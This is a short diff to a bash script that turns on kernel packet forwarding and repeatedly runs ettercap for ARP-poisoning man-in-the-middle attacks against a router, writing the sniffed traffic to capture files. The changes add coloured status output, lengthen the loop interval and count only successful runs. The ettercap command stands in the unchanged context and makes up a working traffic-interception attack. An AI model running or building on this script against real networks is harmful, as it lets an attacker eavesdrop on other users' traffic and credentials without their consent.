@@ -5,9 +5,9 @@ function ip_forward
     echo -n "[*] Setting kernel to forward packets: "
     echo 1 > /proc/sys/net/ipv4/ip_forward;
     if [[ $? == 0 ]]; then
-        echo "OK";
+        echo "\033[32mOK\033[0m";
     else
-        echo "FAIL";
+        echo "\033[33mFAIL\033[0m";
     fi
 }
 
@@ -39,7 +39,7 @@ i=0   # iterations
 iface=$1  # interface
 router_ip=$2  # router ip address
 store_data=/home/shemhazai
-interval=30
+interval=900
 
 
 ip_forward  # forward packets set
@@ -54,6 +54,8 @@ do
     else
         ettercap -Tqi $iface -M arp:remote /$router_ip// /// -s 's(300)qq' -P autoadd -w $store_data/sniffing_$time_stamp.cap;
     fi
-    ((i++));  # increment iterations
-    sleep $interval;
+    if [[ $? == 0 ]]; then
+        ((i++));  # increment iterations
+        sleep $interval;
+    fi
 done
